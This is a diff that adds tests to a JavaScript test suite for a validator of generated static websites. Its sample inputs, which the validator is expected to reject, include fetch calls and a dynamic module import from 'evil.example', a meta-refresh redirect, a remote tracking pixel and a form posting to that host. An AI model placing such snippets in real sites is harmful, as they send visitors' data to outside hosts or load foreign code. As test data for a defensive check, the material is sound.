@@ -28,5 +28,16 @@ describe("generated static website policy", () => {
   it("rejects network behavior and duplicate paths", () => {
     expect(() => validateWebsiteSource({ files: [...valid.files.slice(0, 2), { path: "script.js", content: "fetch('https://evil.example')" }] })).toThrow();
     expect(() => validateWebsiteSource({ files: [valid.files[0], valid.files[0], valid.files[1]] })).toThrow();
+    expect(() => validateWebsiteSource({ files: [...valid.files.slice(0, 2), { path: "script.js", content: "localStorage.setItem('key', 'value')" }] })).toThrow();
+    expect(() => validateWebsiteSource({ files: [...valid.files.slice(0, 2), { path: "script.js", content: "import('https://evil.example/module.js')" }] })).toThrow();
+  });
+
+  it.each([
+    ["meta refresh", "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">"],
+    ["spaced remote source", "<img src = \"https://evil.example/pixel.png\" alt=\"\">"],
+    ["protocol-relative navigation", "<a href=\"//evil.example\">Leave</a>"],
+    ["remote form action", "<form action=\"https://evil.example\"><button>Send</button></form>"],
+  ])("rejects %s as defense in depth", (_name, html) => {
+    expect(() => validateWebsiteSource({ files: [{ path: "index.html", content: html }, { path: "styles.css", content: "body{}" }] })).toThrow();
   });
 });
